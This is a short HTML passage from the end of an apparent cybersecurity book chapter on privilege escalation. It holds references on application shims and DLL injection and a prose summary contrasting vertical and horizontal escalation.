<li>T. Newton, <em>Demystifying Shims - or - Using the App Compat Toolkit to make your old stuff work with your new stuff</em>, <em>Blogs.technet.microsoft.com</em>, 2018. [Online]. Available: <a href="https://blogs.technet.microsoft.com/askperf/2011/06/17/demystifying-shims-or-using-the-app-compat-toolkit-to-make-your-old-stuff-work-with-your-new-stuff/">https://blogs.technet.microsoft.com/askperf/2011/06/17/demystifying-shims-or-using-the-app-compat-toolkit-to-make-your-old-stuff-work-with-your-new-stuff/</a>. [Accessed: 03- Jan- 2018].</li>
<li><em>DLL Injection - enterprise</em>, <em>Attack.mitre.org</em>, 2018. [Online]. Available: <a href="https://attack.mitre.org/wiki/Technique/T1055">https://attack.mitre.org/wiki/Technique/T1055</a>. [Accessed: 03- Jan- 2018].</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p>This chapter has gone through the privilege escalation phase. It has noted that there are two broad classifications of privilege escalation: vertical and horizontal. It has also brought to light that horizontal privilege escalation is the best luck that an attacker can hope for. This is because the methods used for horizontal privilege escalation tend not to be very complex. It has gone through most of the sophisticated vertical privilege escalation methods that attackers use against systems. It is noteworthy that most of the discussed techniques involve attempts to compromise legitimate services and processes in order to get higher privileges. This is probably the last task that the attacker will have to perform in the entire attack.</p>
<p>The next chapter will explain how the attackers deliver the final blow and, if successful, how they reap the rewards of their efforts.</p>
<p> </p>


            </article>

            
        </section>
    </body></html>